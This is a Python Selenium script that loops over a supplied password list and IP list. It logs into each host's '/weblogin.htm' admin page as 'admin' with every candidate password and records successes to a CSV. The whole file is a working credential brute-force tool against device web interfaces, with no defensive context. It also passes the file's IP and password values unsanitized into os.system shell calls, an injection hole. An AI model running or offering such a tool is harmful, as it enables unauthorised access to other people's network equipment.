from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import WebDriverException
import time,sys,os
os.system("@echo off")
os.system("echo Hayde başlayalım.")
# passFileName= "passlist.txt" #debug
# ipFileName= "iplist.txt" #debug
passFileName= sys.argv[1] #release
ipFileName = sys.argv[2] #release
with open(passFileName) as passList: 
    with open(passFileName+'_RESULT.csv', 'a') as resultFile:
        driver = webdriver.Firefox()
        for p in passList:
            p = str.replace(p,"\n","").replace(" ","")

            with open(ipFileName) as ipList:
                for ip in ipList:
                    ip = str.replace(ip,"\n","").replace(" ","")
                    try:
                        driver.get(f"http://{ip}/weblogin.htm")
                    
                        driver.find_element_by_name("sUserName").send_keys("admin")
                        driver.find_element_by_name("sSysPass").send_keys(p)
                        driver.find_element_by_name("btnOk").click()

                        status = "Login Page" not in driver.title
                        if status:
                            status ="success"
                        else: 
                            status = "fail" 

                        os.system(f"echo {ip} {p} {status}")
                        resultFile.writelines(f"{ip};{p};{status};\n")
                    except Exception as e:
                        if "Timeout" in str(e):
                            os.system(f"echo {ip} {p} could not response(timeout)")
                            resultFile.write(f"{ip};{p};could not tested(timeout);\n")
                        else:
                            os.system(f"echo {ip} {p} could not tested")
                            resultFile.write(f"{ip};{p};could not tested;\n")       
os.system("echo Saygılar abi..")
